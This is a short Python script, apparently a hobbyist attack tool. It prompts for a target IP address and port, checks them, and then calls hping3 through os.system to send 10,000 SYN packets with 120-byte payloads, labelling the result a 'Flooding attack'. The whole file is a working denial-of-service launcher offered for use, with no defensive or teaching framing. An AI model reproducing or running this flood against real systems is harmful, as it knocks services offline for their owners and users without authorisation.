import sys
import os
import re
os.system('clear')
 
# regular expression for IPV4 Ip address
regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"

# funciton to validate an Ip address
def check(Ip): 
    
    if(re.search(regex, Ip)):
        return 1
         
    else:
        return 0
    
ip = input("Enter the ip address of target : ") # ip address of target
port  = int(input("Enter the port number : ")) # port number


# verify the port number
if (port < 1 or port>65535):
    print("Invalid port number, please try again")
    exit(0)
    
# verify the ip address and perform the attack
if(check(ip)):
    flood = os.system("/usr/sbin/hping3 %s -p %s -S -c 10000 -d 120" %(ip,port))
    #print port
    print ("")
    print ("End of Flooding attack ")

else:
    print("Invalid IP address , please try again")
